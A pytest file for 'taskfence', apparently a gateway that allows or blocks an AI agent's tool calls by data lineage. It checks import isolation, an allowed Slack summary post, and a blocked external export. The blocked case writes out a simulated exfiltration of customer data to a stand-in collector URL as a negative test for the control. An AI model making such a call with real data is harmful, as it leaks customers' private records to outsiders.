"""No-bypass tests (kit Prompt C3): static + behavioral enforcement."""

import ast
from pathlib import Path

import pytest
from fastapi.testclient import TestClient

from taskfence import registry
from taskfence.gateway import app

AGENTS = ["taskfence/agent.py", "taskfence/client.py"]


def _imports(path: str) -> set:
    tree = ast.parse(Path(path).read_text(encoding="utf-8"))
    found = set()
    for node in ast.walk(tree):
        if isinstance(node, ast.Import):
            found.update(alias.name for alias in node.names)
        elif isinstance(node, ast.ImportFrom):
            found.add(node.module or "")
    return found


def test_agent_side_never_imports_tools_static():
    # client.py exists from Phase C on; agent.py lands in Phase D — the
    # invariant applies to whichever of the two exist (checked every run).
    assert Path("taskfence/client.py").exists()
    for path in AGENTS:
        if not Path(path).exists():
            continue  # agent.py is created in Phase D; checked from then on
        imports = _imports(path)
        assert not any(name == "taskfence.tools" or name.endswith(".tools")
                       for name in imports), (path, imports)


@pytest.fixture()
def client(tmp_path, monkeypatch):
    # Isolate state WITHOUT chdir: data/ paths are CWD-relative.
    monkeypatch.setattr(registry, "OUTBOX_DIR", tmp_path / "outbox")
    import taskfence.gateway as gw
    from taskfence.audit import AuditLog
    from taskfence.lineage import LineageTracker
    monkeypatch.setattr(gw, "TRACKER",
                        LineageTracker(db_path=tmp_path / "lin.db"))
    monkeypatch.setattr(gw, "AUDIT", AuditLog(tmp_path / "audit.db"))
    registry.reset_outbox()
    with TestClient(app) as test_client:
        yield test_client
    registry.reset_outbox()


def _create_task(client) -> str:
    response = client.post("/tasks", json={
        "task_text": "Summarize Q3 sales and post it to #sales."})
    assert response.status_code == 200, response.text
    return response.json()["task_id"]


def test_scenario_a_executes(client):
    task_id = _create_task(client)
    response = client.post(f"/tasks/{task_id}/tool-call", json={
        "tool": "send_slack",
        "args": {"asset_id": "sales_report_q3", "channel": "#sales",
                 "text": "Q3: steady growth across all regions.",
                 "source_assets": ["sales_report_q3"],
                 "transformation": "summary"}})
    body = response.json()
    assert body["decision"]["outcome"] == "ALLOW", body
    assert len(registry.sink_lines("slack_sales")) == 1


def test_scenario_b_blocks_and_never_touches_the_sink(client):
    task_id = _create_task(client)
    before = (registry.OUTBOX_DIR /
              registry.SINKS["external_api"]).read_bytes()
    response = client.post(f"/tasks/{task_id}/tool-call", json={
        "tool": "post_external",
        "args": {"url": "https://collect.example.invalid/ingest",
                 "payload": "customer data",
                 "source_assets": ["customer_db"],
                 "transformation": "export"}})
    body = response.json()
    assert body["decision"]["outcome"] == "BLOCK", body
    after = (registry.OUTBOX_DIR /
             registry.SINKS["external_api"]).read_bytes()
    assert after == before  # byte-identical (kit Prompt C3)


def test_blocked_agent_message_hides_policy_internals(client):
    task_id = _create_task(client)
    response = client.post(f"/tasks/{task_id}/tool-call", json={
        "tool": "post_external",
        "args": {"url": "https://collect.example.invalid/ingest",
                 "payload": "customer data",
                 "source_assets": ["customer_db"]}})
    body = response.json()
    message = body["agent_message"]
    assert "denied by security policy" in message
    for secret in ("external_api", "CUSTOMER_DATA", "contract", "lineage",
                   "reason"):
        assert secret not in message.lower(), message
